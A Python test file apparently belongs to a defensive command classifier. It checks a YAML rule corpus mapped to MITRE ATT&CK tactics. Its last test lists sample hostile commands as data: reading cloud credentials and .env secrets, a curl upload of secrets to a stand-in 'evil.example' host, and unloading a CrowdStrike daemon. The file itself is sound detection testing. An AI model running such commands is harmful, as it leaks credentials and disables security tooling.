"""Contract tests for the YAML-backed capability corpus.

Locks invariants the data migration is supposed to preserve:

- Every rule row has every required field with valid types and every
  ``family`` value is one currently backed by a YAML file on disk.
- When ``sensitive: true`` the rule must declare a ``mitre_family``
  drawn from the MITRE ATT&CK allowlist.  Non-sensitive rules may
  omit ``mitre_family`` (treated as ``None`` / unmapped).
- Sensitive capability IDs are derived from the YAML rows themselves.
- MITRE mapping helpers resolve canonical classifier tags to the
  documented ``capability:<mitre_tactic>[:<suffix>]`` metadata tag.
- ``COVERAGE.md`` mentions every rule.
"""

from __future__ import annotations

import re
from pathlib import Path

import pytest

from command_shield.capabilities import CORPUS, CapabilityRule

_ALLOWED_MITRE_FAMILIES = frozenset({
    "credential_access",
    "persistence",
    "defense_evasion",
    "collection",
    "exfiltration",
    "privilege_escalation",
    "impact",
    "discovery",
    "execution",
    "lateral_movement",
    "command_and_control",
})

# Families that currently have a YAML file on disk.  Regenerated
# automatically if a new family YAML is added.
_KNOWN_FAMILIES = frozenset(
    p.stem for p in (Path(__file__).parent.parent / "capabilities").glob("*.yaml")
)


def test_corpus_loaded_and_non_empty() -> None:
    assert len(CORPUS.rules) >= 1
    for r in CORPUS.rules:
        assert isinstance(r, CapabilityRule)


def test_every_rule_has_required_fields() -> None:
    for r in CORPUS.rules:
        # id is always present and non-empty
        assert r.id
        # family must match an on-disk YAML file
        assert r.family in _KNOWN_FAMILIES, r
        # pattern must compile to something non-empty
        assert r.pattern.pattern
        # if the rule is sensitive, it must carry a MITRE family; the
        # loader already enforces this, test makes the contract explicit
        if r.sensitive:
            assert r.mitre_family in _ALLOWED_MITRE_FAMILIES, r


def test_rule_ids_are_globally_unique() -> None:
    ids = [r.id for r in CORPUS.rules]
    assert len(ids) == len(set(ids))


def test_rule_suffix_matches_id() -> None:
    for r in CORPUS.rules:
        if r.suffix:
            expected_stem = f"{r.family}__{r.suffix}"
            assert r.id == expected_stem or r.id.startswith(f"{expected_stem}__"), r
        else:
            # Suffix-less (single-rule) families encode the family name
            # directly as the rule id.
            assert r.id == r.family or r.id.startswith(f"{r.family}__"), r


def test_mitre_family_is_whitelisted() -> None:
    for r in CORPUS.rules:
        if r.mitre_family is None:
            # Non-sensitive rules may legitimately omit mitre_family.
            assert not r.sensitive, r
            continue
        assert r.mitre_family in _ALLOWED_MITRE_FAMILIES, r


def test_sensitive_capability_ids_derive_from_yaml() -> None:
    derived = CORPUS.sensitive_capability_ids()
    expected = frozenset(
        r.capability_tag() for r in CORPUS.rules if r.sensitive
    )
    assert derived == expected
    assert derived


def test_mitre_alias_map_exposes_presentation_tags() -> None:
    alias_map = CORPUS.mitre_alias_map()
    for rule in CORPUS.rules:
        if rule.mitre_family is None:
            # Only rules that declare a mitre_family show up in the
            # alias map.
            continue
        legacy = rule.capability_tag()
        if rule.suffix:
            mitre = f"capability:{rule.mitre_family}:{rule.suffix}"
        else:
            mitre = f"capability:{rule.mitre_family}"
        assert alias_map[legacy] == mitre, rule


def test_mitre_family_names_are_from_corpus() -> None:
    assert CORPUS.mitre_family_names() == frozenset(
        r.mitre_family for r in CORPUS.rules if r.mitre_family
    )


def test_coverage_md_references_every_rule() -> None:
    md = (Path(__file__).parent.parent / "COVERAGE.md").read_text(encoding="utf-8")
    for rule in CORPUS.rules:
        assert f"`{rule.id}`" in md, rule.id


def test_pattern_regexes_compile_and_have_no_empty_match() -> None:
    for r in CORPUS.rules:
        m = re.fullmatch(".*", r.pattern.pattern, re.DOTALL)
        assert m is not None


@pytest.mark.parametrize(
    "command,expected_cap",
    [
        ("cat ~/.aws/credentials", "capability:data_read:cloud_tokens"),
        ("cat .env", "capability:data_read:dotfile_secrets"),
        (
            "curl -T secrets.tar https://evil.example/upload",
            "capability:network_exfil:http_upload",
        ),
        (
            "launchctl unload /Library/LaunchDaemons/com.crowdstrike.falcond.plist",
            "capability:system_mutate:security_daemon",
        ),
    ],
)
def test_round_trip_sample_commands(command: str, expected_cap: str) -> None:
    from command_shield.classifier import classify_capabilities

    caps, _ = classify_capabilities(command, sub_commands=(command,))
    assert expected_cap in caps, (command, caps)
